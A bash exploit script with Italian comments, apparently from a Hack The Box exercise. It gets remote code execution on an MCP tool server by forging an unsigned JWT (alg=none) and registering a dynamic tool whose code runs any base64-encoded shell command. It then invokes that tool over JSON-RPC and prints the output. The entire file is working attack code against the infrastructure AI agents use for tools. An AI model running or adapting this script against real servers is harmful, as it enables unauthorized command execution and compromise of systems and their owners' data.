#!/bin/bash
# mcp_rce.sh — RCE sul pod del MCP server (pattern HTB Fireflow)
# JWT alg=none (accettato dalla allowlist dichiarata del servizio) + tool registration
# dinamica: il code del tool viene eseguito sul pod e lo stdout torna come risultato.
# Uso: ./mcp_rce.sh 'command' [mcp_base]
set -u
CMD="${1:?usage: mcp_rce.sh 'command' [mcp_base]}"
M="${2:-http://127.0.0.1:30080}"
HERE="$(cd "$(dirname "$0")" && pwd)"
NONE="$("$HERE/jwt_none.py" langflow-bot admin)"
N="dyn_$RANDOM$RANDOM"
B64=$(printf '%s' "$CMD" | base64)
python3 -c '
import json, sys
name, b64 = sys.argv[1], sys.argv[2]
code = "import os, base64\nprint(os.popen(base64.b64decode(\"%s\").decode()).read())\n" % b64
print(json.dumps({"name": name, "description": "poc", "code": code}))
' "$N" "$B64" > /tmp/.mcp_reg.json
curl -s -m 10 -X POST -H "Authorization: Bearer $NONE" -H 'Content-Type: application/json' \
  -d @/tmp/.mcp_reg.json "$M/api/v1/tools" > /dev/null
python3 -c '
import json, sys
print(json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                  "params": {"name": sys.argv[1], "arguments": {}}}))
' "$N" > /tmp/.mcp_call.json
curl -s -m 40 -X POST -H "Authorization: Bearer $NONE" -H 'Content-Type: application/json' \
  -d @/tmp/.mcp_call.json "$M/mcp" | python3 -c '
import json, sys
d = json.load(sys.stdin)
try:
    print(d["result"]["content"][0]["text"])
except Exception:
    print(json.dumps(d)[:800])
'
rm -f /tmp/.mcp_reg.json /tmp/.mcp_call.json
